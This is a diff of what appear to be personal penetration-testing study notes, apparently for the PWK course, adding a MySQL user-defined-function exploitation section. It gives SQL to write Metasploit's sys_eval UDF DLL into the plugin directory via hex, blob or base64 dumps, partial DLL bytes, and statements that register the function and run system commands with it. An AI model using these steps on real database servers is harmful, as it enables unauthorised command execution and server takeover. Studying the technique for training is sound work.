@@ -3299,9 +3299,43 @@ EOF
      #+END_SRC
      
 ** Targeting the Database
-   + check version. is updated?
+   + check version. If updated, check else.
      
-*** Application/Service Enumeration
+*** TODO Application/Service Enumeration (mysql udf exploit)
+    + TODO: try udf
+    + requirement: Write permission
+    + ref(mysql-UDF): [[./ref/b3cp24_44139-mysql-udf-exploitation.pdf][mysql-udf-exploitation]]
+    + info:
+      - use mysql load_file() to load udf to a specific path(@@plugin_dir, or @@datadir\bin, %SystemRoot%\system32). 
+      - file content from network paths, or write hex to file.
+        #+begin_src sql
+select hex(load_file('/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll')) into dumpfile '/tmp/udf.hex';
+        /* (ref p7) */
+        #+end_src
+      - or write binary to a table (or select $binary into dump file "$plugin_dir"?)
+      #+begin_src sql
+create table temp(data longblob);
+insert into temp(data) values 
+(0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000f00000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000000000000000000);
+
+update temp set data = concat(data,0x33c2ede077a383b377a383b377a383b369f110b375a383b369f100b37da383b369f107b
+375a383b35065f8b374a383b377a382b35ba383b369f10ab376a383b369f116b375a383b369f111b376a3
+83b369f112b376a383b35269636877a383b30000000000000000000000000000000050450000648606007
+0b1834b00000000);
+
+select data from temp into dump file "D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21- winx64\\lib\\plugin\\udf.dll";
+      #+end_src
+      - or use to_base64 function > MySQL 5.6.1/MariaDB 10.0.5
+      #+begin_src sql
+select to_base64(load_file('/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll')) into dumpfile '/tmp/udf.b64';
+select
+from_base64("TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... ")
+into dumpfile "D:\\MySQL\\mysql-5.7.21-winx64\\mysql-5.7.21-
+winx64\\lib\\plugin\\udf.dll";
+/* Q: ref p9 the modified dll content? */
+      #+end_src
+
+    + src basic-enum:
     #+BEGIN_SRC sh
 mysql --host=127.0.0.1 --port=13306 --user=wp -p [password]
     ## the MariaDB command-line tool
@@ -3316,7 +3350,31 @@ MariaDB [(none)]> SHOW variables;  # system variables, require no permission.
 ## | version_compile_machine     | x86_64 |
 # (PWK p781)
     #+END_SRC
+    + src searchsploit:
+    #+begin_src sh
+searchsploit mariadb
+searchsploit mysql
+  # UDF occur multiple times
+    #+end_src
 
+**** udf sql commands
+     + info:
+       - some sql commands to install, verify, delete an udf.
+       - more commands by walking the dll binary.
+     + src:
+     #+begin_src sql
+/** install */
+create function sys_eval returns string soname 'udf.dll';
+/** verify */
+select * from mysql.func where name = 'sys_eval';
+/** delete */
+drop function sys_eval;
+/** run */
+select sys_eval('dir');
+     #+end_src
+
+**** the PWK way. 
+     // continue p785
 
 
 * TODO list
